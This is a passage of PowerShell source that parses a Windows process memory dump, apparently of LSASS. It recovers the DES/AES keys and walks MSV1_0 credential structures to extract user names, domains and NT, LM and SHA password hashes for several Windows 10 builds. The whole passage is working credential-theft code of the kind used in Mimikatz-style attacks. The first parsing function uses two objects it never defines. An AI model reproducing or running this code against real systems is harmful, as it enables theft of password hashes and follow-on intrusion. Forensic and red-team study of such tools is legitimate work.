        if($CredentialParsingFunction -eq "Parse-PrimaryCredential")
            {
            $decrypted_data = Parse-PrimaryCredential -DecString $DecryptedCredsStr -Dump $Dump
            }
        elseif ($CredentialParsingFunction -eq "Parse-PrimaryCredential-Win10-old") {
            $decrypted_data = Parse-PrimaryCredential-Win10-old -DecString $DecryptedCredsStr -Dump $Dump
        }
        elseif ($CredentialParsingFunction -eq "Parse-PrimaryCredential-Win10") {

            $decrypted_data = Parse-PrimaryCredential-Win10 -DecString $DecryptedCredsStr -Dump $Dump
        }
        elseif ($CredentialParsingFunction -eq "Parse-PrimaryCredential-Win10-1607") {
            $decrypted_data = Parse-PrimaryCredential-Win10-1607 -DecString $DecryptedCredsStr -Dump $Dump
        }

        $MSV1_0_PRIMARY_CREDENTIAL_ENC = New-Object -Type psobject -Property (@{
            "flink" = $flink
            "Primary" = $Primary
            "encrypted_data" = $encrypted_data
            "decrypted_data" = $decrypted_data
            })
    
        return $MSV1_0_PRIMARY_CREDENTIAL_ENC
        }   
    
        function Parse-PrimaryCredential
        {
        Param(
            [string]$DecString,
            $Dump
        )        
        
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $null
            "UserName" = $null
            "NtOwfPassword" = $null
            "LmOwfPassword" = $null
            "ShaOwPassword" = $null
            "isNtOwfPassword" =$null
            "isLmOwfPassword" = $null
            "isShaOwPassword" =$null
             })
    
        $Position = 0
        $LogonDomainName.Position = $Position
        $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16 
        $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
        $DecUsername.Position = $Position
        $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16
        $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
        $NtOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $LmOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $ShaOwPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $isNtOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isLmOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isShaOwPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
     
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $LogonDomainName
            "UserName" = $DecUsername
            "NtOwfPassword" = $NtOwfPassword
            "LmOwfPassword" = $LmOwfPassword
            "ShaOwPassword" = $ShaOwPassword
            "isNtOwfPassword" =$isNtOwfPassword
            "isLmOwfPassword" = $isLmOwfPassword
            "isShaOwPassword" =$isShaOwPassword
            })
        return $ParsedCreds
        }
    
    function Parse-PrimaryCredential-Win10-old
        {
            Param(
                [string]$DecString,
                $Dump
            )        
            
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $null
            "UserName" = $null
            "isIso" = $null
            "isNtOwfPassword" =$null
            "isLmOwfPassword" = $null
            "isShaOwPassword" =$null
            "align0" =$null
            "align1" = $null
            "NtOwfPassword" = $null
            "LmOwfPassword" = $null
            "ShaOwPassword" = $null
             })
             
        $LogonDomainName = New-Object -Type psobject -Property (@{
                "Position" = $Null
                "Length" =  $null # 2 Bytes
                "MaxLength" = $null # 2 Bytes
                "Buffer" = $null # 8 Bytes
                "Data" = $null
                })
        $DecUsername = New-Object -Type psobject -Property (@{
                "Position" = $Null
                "Length" =  $null # 2 Bytes
                "MaxLength" = $null # 2 Bytes
                "Buffer" = $null # 8 Bytes
                "Data" = $null
                })
    
        $Position = 0
        $LogonDomainName.Position = $Position
        $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16 
        $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
        $DecUsername.Position = $Position
        $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16
        $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
        $isIso =  $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isNtOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isLmOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isShaOwPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align0 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align1 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $NtOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $LmOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $ShaOwPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $LogonDomainName
            "UserName" = $DecUsername
            "isIso" = $isIso
            "isNtOwfPassword" =$isNtOwfPassword
            "isLmOwfPassword" = $isLmOwfPassword
            "isShaOwPassword" =$isShaOwPassword
            "align0" =$align0
            "align1" = $align1
            "NtOwfPassword" = $NtOwfPassword
            "LmOwfPassword" = $LmOwfPassword
            "ShaOwPassword" = $ShaOwPassword
             })
        return $ParsedCreds
        }
        
    function Parse-PrimaryCredential-Win10
        {    
            Param(
                [string]$DecString,
                $Dump
            )        
            
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $null
            "UserName" = $null
            "isIso" = $null
            "isNtOwfPassword" =$null
            "isLmOwfPassword" = $null
            "isShaOwPassword" =$null
            "align0" =$null
            "align1" = $null
            "align2" = $null
            "align3" = $null
            "NtOwfPassword" = $null
            "LmOwfPassword" = $null
            "ShaOwPassword" = $null
             })
    
        $LogonDomainName = New-Object -Type psobject -Property (@{
                "Position" = $Null
                "Length" =  $null # 2 Bytes
                "MaxLength" = $null # 2 Bytes
                "Buffer" = $null # 8 Bytes
                "Data" = $null
                })
        $DecUsername = New-Object -Type psobject -Property (@{
                "Position" = $Null
                "Length" =  $null # 2 Bytes
                "MaxLength" = $null # 2 Bytes
                "Buffer" = $null # 8 Bytes
                "Data" = $null
                })
    
        $Position = 0
        $LogonDomainName.Position = $Position
        $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16 
        $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
        $DecUsername.Position = $Position
        $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16
        $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
        $isIso =  $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isNtOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isLmOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isShaOwPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isDPAPIProtected = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align0 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align1 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align2 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align3 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $NtOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $LmOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $ShaOwPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $LogonDomainName
            "UserName" = $DecUsername
            "isIso" = $isIso
            "isNtOwfPassword" =$isNtOwfPassword
            "isLmOwfPassword" = $isLmOwfPassword
            "isShaOwPassword" =$isShaOwPassword
            "align0" =$align0
            "align1" = $align1
            "align2" = $align2
            "align3" = $align3
            "NtOwfPassword" = $NtOwfPassword
            "LmOwfPassword" = $LmOwfPassword
            "ShaOwPassword" = $ShaOwPassword
             })
        return $ParsedCreds
        }
    
    function Parse-PrimaryCredential-Win10-1607
        {
        Param(
            [string]$DecString,
            $Dump
        )
        
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $null
            "UserName" = $null
            "pNtlmCredIsoInProc" = $null
            "isIso" = $null
            "isNtOwfPassword" =$null
            "isLmOwfPassword" = $null
            "isShaOwPassword" =$null
            "isDPAPIProtected" =$null
            "align0" =$null
            "align1" = $null
            "align2" = $null
            "unkD" = $null
            "isoSize" =$null
            "DPAPIProtected" = $null
            "align3" = $null
            "NtOwfPassword" = $null
            "LmOwfPassword" = $null
            "ShaOwPassword" = $null
        })
        
        
        
        $LogonDomainName = New-Object -Type psobject -Property (@{
            "Position" = $Null
            "Length" =  $null # 2 Bytes
            "MaxLength" = $null # 2 Bytes
            "Buffer" = $null # 8 Bytes
            "Data" = $null
        })
        
        $DecUsername = New-Object -Type psobject -Property (@{
            "Position" = $Null
            "Length" =  $null # 2 Bytes
            "MaxLength" = $null # 2 Bytes
            "Buffer" = $null # 8 Bytes
            "Data" = $null
        })
                
        $Position = 0
        $LogonDomainName.Position = $Position
        $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
                        
        $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16 
        $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
        $DecUsername.Position = $Position
        $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
        $Position = $Position + 4 
        $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
        $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
        $Position = $Position + 16
        $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
        $pNtlmCredIsoInProc = $DecString.Substring($Position,16)
        $Position = $Position + 16
        $isIso =  $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isNtOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isLmOwfPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isShaOwPassword = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $isDPAPIProtected = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align0 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align1 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $align2 = $DecString.Substring($Position,2)
        $Position = $Position + 2
        $unkD = $DecString.Substring($Position,8)
        $Position = $Position + 8 
        $isoSize = $DecString.Substring($Position,4)
        $Position = $Position + 4
        $DPAPIProtected = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $align3 = $DecString.Substring($Position,8)
        $Position = $Position + 8 
         
        $NtOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $LmOwfPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        $ShaOwPassword = $DecString.Substring($Position,32)
        $Position = $Position + 32
        
        
        $ParsedCreds = New-Object -Type psobject -Property (@{
            "LogonDomainName" = $LogonDomainName
            "UserName" = $DecUsername
            "pNtlmCredIsoInProc" = $pNtlmCredIsoInProc
            "isIso" = $isIso
            "isNtOwfPassword" =$isNtOwfPassword
            "isLmOwfPassword" = $isLmOwfPassword
            "isShaOwPassword" =$isShaOwPassword
            "isDPAPIProtected" =$isDPAPIProtected
            "align0" =$align0
            "align1" = $align1
            "align2" = $align2
            "unkD" = $unkD
            "isoSize" =$isoSize
            "DPAPIProtected" = $DPAPIProtected
            "align3" = $align3
            "NtOwfPassword" = $NtOwfPassword
            "LmOwfPassword" = $LmOwfPassword
            "ShaOwPassword" = $ShaOwPassword
        })
                
        
        return $ParsedCreds
        }
    <#
    function Parse-Credentials
        {
        Param(
            [string]$DecString,
            $Dump
        )
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
                "LogonDomainName" = $null
                "UserName" = $null
                "pNtlmCredIsoInProc" = $null
                "isIso" = $null
                "isNtOwfPassword" =$null
                "isLmOwfPassword" = $null
                "isShaOwPassword" =$null
                "isDPAPIProtected" =$null
                "align0" =$null
                "align1" = $null
                "align2" = $null
                "unkD" = $null
                "isoSize" =$null
                "DPAPIProtected" = $null
                "align3" = $null
                "NtOwfPassword" = $null
                "LmOwfPassword" = $null
                "ShaOwPassword" = $null
                 })
    
    
    
        $LogonDomainName = New-Object -Type psobject -Property (@{
                 "Position" = $Null
                 "Length" =  $null # 2 Bytes
                 "MaxLength" = $null # 2 Bytes
                 "Buffer" = $null # 8 Bytes
                 "Data" = $null
                 })
        $DecUsername = New-Object -Type psobject -Property (@{
                 "Position" = $Null
                 "Length" =  $null # 2 Bytes
                 "MaxLength" = $null # 2 Bytes
                 "Buffer" = $null # 8 Bytes
                 "Data" = $null
                 })
    
            $Position = 0
            $LogonDomainName.Position = $Position
            $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
            $Position = $Position + 4 
            $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
            $Position = $Position + 4 
            $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
            
            $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
            $Position = $Position + 16 
            $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
            $DecUsername.Position = $Position
            $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
            $Position = $Position + 4 
            $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
            $Position = $Position + 4 
            $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
            $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
            $Position = $Position + 16
            $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
            $pNtlmCredIsoInProc = $DecString.Substring($Position,16)
            $Position = $Position + 16
            $isIso =  $DecString.Substring($Position,2)
            $Position = $Position + 2
            $isNtOwfPassword = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $isLmOwfPassword = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $isShaOwPassword = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $isDPAPIProtected = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $align0 = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $align1 = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $align2 = $DecString.Substring($Position,2)
            $Position = $Position + 2
            $unkD = $DecString.Substring($Position,8)
            $Position = $Position + 8 
            $isoSize = $DecString.Substring($Position,4)
            $Position = $Position + 4
            $DPAPIProtected = $DecString.Substring($Position,32)
            $Position = $Position + 32
            $align3 = $DecString.Substring($Position,8)
            $Position = $Position + 8 
     
            $NtOwfPassword = $DecString.Substring($Position,32)
            $Position = $Position + 32
            $LmOwfPassword = $DecString.Substring($Position,32)
            $Position = $Position + 32
            $ShaOwPassword = $DecString.Substring($Position,32)
            $Position = $Position + 32
    
    
        $ParsedCreds = New-Object -Type psobject -Property (@{
                "LogonDomainName" = $LogonDomainName
                "UserName" = $DecUsername
                "pNtlmCredIsoInProc" = $pNtlmCredIsoInProc
                "isIso" = $isIso
                "isNtOwfPassword" =$isNtOwfPassword
                "isLmOwfPassword" = $isLmOwfPassword
                "isShaOwPassword" =$isShaOwPassword
                "isDPAPIProtected" =$isDPAPIProtected
                "align0" =$align0
                "align1" = $align1
                "align2" = $align2
                "unkD" = $unkD
                "isoSize" =$isoSize
                "DPAPIProtected" = $DPAPIProtected
                "align3" = $align3
                "NtOwfPassword" = $NtOwfPassword
                "LmOwfPassword" = $LmOwfPassword
                "ShaOwPassword" = $ShaOwPassword
                 })
            
    
        return $ParsedCreds
        }
    #>
    Function Get-LUID
        {
        Param(
            [string]$InputStr
        )
        
    
        $LowPart = Convert-LitEdian $InputStr.Substring(0,8)
        $HighPart= Convert-LitEdian $InputStr.Substring(8,8)
        $HighPart = ("{0:x}" -f ([convert]::toint64($HighPart,16) -shl 32).tostring().PadLeft(8,"0"))
        $result= $HighPart + $LowPart
        return $result
        }
    
    Function Get-Align
        {
        Param(
        [String]$Position,
        [String]$Architecture,
        $Address,
        $Dump
        )
    
        if($AllignmentOffset -lt 0)
            {
            if($Architecture -eq "AMD64")
                {
                $Allignment = 8
                }
            else
                {
                $Allignment = 4
                }
            }
        else
            {
            $Allignment = $AllignmentOffset
            }
    
        if($Address.length -eq 0)
            {
            $Address = ([convert]::toint64((Get-PositionAddress -Position $Position -Dump $Dump),16))
            }
        else
            {
            $Address= ([convert]::toint64($Address,16) + ($Position / 2))
            }
    
        $AlOffset = $Address % $Allignment
    
        if($AlOffset -eq 0)
            {
            $result = 0
            return $result
            }
        else
            {
            $result = ($Allignment - $AlOffset) % $Allignment
            return $result
            }
    
        }
    
    Function Get-PositionAddress
        {
        param(
            $Position,
            $Dump
        )
    
        $MemoryRanges64 = $Dump.Memory64ListStream
        
        $Start = ($MemoryRanges64.Start_File_Address | where {$_ -le ( "{0:x16}" -f  ($Position))})[-1]
        $MemoryRange= $MemoryRanges64 | where {$_.Start_File_Address -eq $start}
    
        # More clean but slower than the multi-step part
        #$MemoryRange = ($MemoryRanges64 | where {$_.Start_File_Address -eq ($MemoryRanges64.Start_File_Address | where {[convert]::toint64($_,16) -lt $Position})[-1]})
        $Address ="{0:x16}" -f   ([convert]::toint64($MemoryRange.Start_virtual_Address,16) +($Position - [convert]::toint64($MemoryRange.Start_File_Address,16)))
    
        return $Address
        }

    $MINIDUMP_STREAM_TYPE = New-Object -Type psobject -Property (@{
            "UnusedStream"			   	= 0
            "ReservedStream0"			= 1
            "ReservedStream1"			= 2
            "ThreadListStream"		   	= 3
            "ModuleListStream"		   	= 4
            "MemoryListStream"		   	= 5
            "ExceptionStream"			= 6
            "SystemInfoStream"		   	= 7
            "ThreadExListStream"	 	= 8
            "Memory64ListStream"	 	= 9
            "CommentStreamA"		 	= 10
            "CommentStreamW"		 	= 11
            "HandleDataStream"		   	= 12
            "FunctionTableStream"		= 13
            "UnloadedModuleListStream" 	= 14
            "MiscInfoStream"		 	= 15
            "MemoryInfoListStream"	   	= 16
            "ThreadInfoListStream"	   	= 17
            "HandleOperationListStream"	= 18
            "TokenStream" 				= 19
            "JavaScriptDataStream" 		= 20
            "SystemMemoryInfoStream"	= 21
            "ProcessVmCountersStream" 	= 22
            "ThreadNamesStream"			= 24
            "ceStreamNull" 				= 25
            "ceStreamSystemInfo"		= 26
            "ceStreamException" 		= 27
            "ceStreamModuleList"		= 28
            "ceStreamProcessList" 		= 29
            "ceStreamThreadList" 		= 30
            "ceStreamThreadContextList"	= 31
            "ceStreamThreadCallStackList"= 32
            "ceStreamMemoryVirtualList" = 33
            "ceStreamMemoryPhysicalList"= 34
            "ceStreamBucketParameters" 	= 35
            "ceStreamProcessModuleMap" 	= 36
            "ceStreamDiagnosisList"		= 37
            "LastReservedStream"	 	= 0xffff
        })

    $Minidump_location_decriptor = New-Object -Type psobject -Property (@{
        "DataSize" = $null
        "RVA" = $null
        })

    if($Debug -eq $true)
        {
            $DebugPreference = "Continue"
        }
    else {
            $DebugPreference = "SilentlyContinue"
    }
    
    if((Test-Path $PathToDMP) -and ($PathToDMP.Length -gt 0))
        {
        Write-Debug -Message ("Inputfile valid and identified in: " + $PathToDMP)

        }
    else 
        {
        Write-Debug -Message ("Inputfile could not be found under: " + $PathToDMP)
        Write-Debug -Message ("Script is terminated")
        Exit
        }



    $Header = Get-Header -PathToDMP $PathToDMP
    Write-Debug -Message ("Header of Dumpfile parsed. Dumpfile holds " + [convert]::toint64(($Header.NumberOfStreams).trim(),16) + " Streams.")


    $Directories = @()
    for($i=0;$i -lt [convert]::toint64(($Header.NumberOfStreams).trim(),16);$i++)
        {
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Position=0
        $fileReader.BaseStream.Seek(([convert]::toint64(($Header.StreamDirectoryRva).trim(),16) + $i * 12),[System.IO.SeekOrigin]::Begin)  | Out-Null
    
    
        $Raw_Stream_Type = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        
        $StreamType = $Null
        $StreamType= $MINIDUMP_STREAM_TYPE.psObject.Properties | where {$_.value -like ([convert]::toint64(($Raw_Stream_Type).trim(),16))}
        if($StreamType -eq $null -and ([convert]::toint64(($Raw_Stream_Type).trim(),16)) -gt $MINIDUMP_STREAM_TYPE.LastReservedStream)
            {
            $Minidump_location_decriptor = New-Object -Type psobject -Property (@{
                "DataSize" = "Not Supported"
                "RVA" = "Not Supported"
                })
            $StreamType = "Not Supported"
            }
        else
            {
            $Localtion_Descriptor_DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Localtion_Descriptor_RVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Minidump_location_decriptor = New-Object -Type psobject -Property (@{
                "DataSize" = $Localtion_Descriptor_DataSize
                "RVA" = $Localtion_Descriptor_RVA
                })
            
            }
        
        $Directories += New-Object -Type psobject -Property (@{
            "StreamType" = $StreamType
            "Location" = $Minidump_location_decriptor
            })
    
    
        }
    
    $Dump = New-Object -Type psobject -Property (@{
        ThreadListStream = $Null
        ThreadInfoListStream = $Null
        ModuleListStream = $Null
        UnloadedModuleListStream = $Null
        Memory64ListStream = $Null
        MemoryInfoListStream = $Null
        SystemInfoStream = $Null
        MiscInfoStream = $Null
        HandleDataStream = $Null
        SystemMemoryInfoStream = $Null
        ProcessVmCountersStream = $Null
        })
    
    foreach($Directory in $Directories)
        {
        if($Directory.StreamType.Name -eq "ThreadListStream")
            {
            $ThreadStream = $Directory
            $Threads = Get-ThreadListStream -PathToDMP $PathToDMP -ThreadStream $ThreadStream
            $Dump.ThreadListStream = $Threads
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "ModuleListStream")
            {
            $ModuleStream = $Directory
            $Modules = Get-ModuleStream -PathToDMP $PathToDMP -ModuleStream $ModuleStream
            $Dump.ModuleListStream = $Modules
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "MemoryInfoListStream")
            {
            $MemoryInfoStream = $Directory
            $MemoryInfos = Get-MemoryInfoStream -MemoryInfoStream $MemoryInfoStream -PathToDMP $PathToDMP
            $Dump.MemoryInfoListStream = $MemoryInfos
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "UnloadedModuleListStream")
            {
            $UnloadedModuleListStream = $Directory
            $UnloadedModules = Get-UnloadedModuleListStream -UnloadedModuleListStream $UnloadedModuleListStream -PathToDMP $PathToDMP
            $Dump.UnloadedModuleListStream = $UnloadedModules
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "ThreadInfoListStream")
            {
            $ThreadInfoStream= $Directory
            $ThreadInfos = Get-ThreadInfoStream -ThreadInfoStream $ThreadInfoStream -PathToDMP $PathToDMP
            $Dump.ThreadInfoListStream = $ThreadInfos
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "SystemInfoStream")
            {
            $SystemInfoStream = $Directory
            $SystemInfo = Get-SystemInfoStream -PathToDMP $PathToDMP -SystemInfoStream $SystemInfoStream
            $Dump.SystemInfoStream = $SystemInfo
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "Memory64ListStream")
            {
            $Memory64Stream = $Directory
            $MemoryRanges64 = Get-Memory64Stream -Memory64Stream $Memory64Stream -PathToDMP $PathToDMP
            $Dump.Memory64ListStream = $MemoryRanges64
            }
        else
            {
            
            }
    
        if($Directory.StreamType.Name -eq "MiscInfoStream")
            {
            $MiscInfoStream = $Directory
            $MiscInfos = Get-MiscInfoStream -MiscInfoStream $MiscInfoStream -PathToDMP $PathToDMP
            $Dump.MiscInfoStream = $MiscInfos
            }
        else
            {
            
            }
        }
    Write-Debug -Message ("Streams successfully parsed - dumpfile fully imported.")


    $Crypto = Get-CryptoData -PathToDMP $PathToDMP -Dump $Dump
    Write-Debug -Message ("Crypto Material extracted: ")
    Write-Debug -Message ("DESKey: " + $Crypto.DESKey)
    Write-Debug -Message ("AESKey: " + $Crypto.AESKey)
    Write-Debug -Message ("IV: " + $Crypto.IV)

    $CredData = Get-CredentialAddresses -PathToDMP $PathToDMP -Dump $Dump 
    Write-Debug -Message ("Credential Material extracted: ")
    Write-Debug -Message ("MSVEntry address: " + $CredData.MSVEntry)
    Write-Debug -Message ("Number of credentialentries: " + $CredData.CredentialEntries.count)
    Write-Debug -Message ("Template for parsing: " + $CredData.MSVTemplate.ParsingFunction)
    Write-Debug -Message ("Template for parsing: " + $CredData.MSVTemplate.CredParsingFunction)
    $CredAddresses = $CredData.CredentialEntries
    $CredTemplate =$CredData.MSVTemplate
    $CredentialList = @()

    foreach($Address in $CredAddresses)
        {
        while(1 -gt 0)
            {    
            $AddressArray = @()       
            if($CredentialEntry.flink -eq $null)
                {
                $NEntry = $Address
                }
            else
                {
                $NEntry = $CredentialEntry.flink
                }
            $CredEntryAddressInitialPosition = Get-MemoryAddress -MemoryAddress $NEntry  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP
            $CredentialEntry = $null
            if($CredTemplate.ParsingFunction -eq "Get-MSV1_0_LIST_62")
                {
                $CredentialEntry = Get-MSV1_0_LIST_62 -InitialPosition $CredEntryAddressInitialPosition.position -StartAddress $NEntry -DESKey $Crypto.DESKey -IV $Crypto.IV -PathToDMP $PathToDMP -Dump $Dump -CredentialParsingFunction $CredTemplate.CredParsingFunction
                }
            else 
                {
                $CredentialEntry = Get-MSV1_0_LIST_63 -InitialPosition $CredEntryAddressInitialPosition.position -StartAddress $NEntry -DESKey $Crypto.DESKey -IV $Crypto.IV -PathToDMP $PathToDMP -Dump $Dump -CredentialParsingFunction $CredTemplate.CredParsingFunction
                }
            $CredentialList += $CredentialEntry
            if($CredentialEntry.flink -eq ("{0:x16}" -f ((([convert]::toint64(($CredData.MSVEntry).trim(),16) - ($CredAddresses.Count * 8))))))
                {
                break
                }
            }
        }
    Write-Debug -Message ("Credentialparsing completed.")

    $Outcome = @()
    $Outcome += New-Object -Type psobject -Property (@{
        "Username" = $null
        "LogonDomain" =  $null
        "NTHash" = $null
        })
    
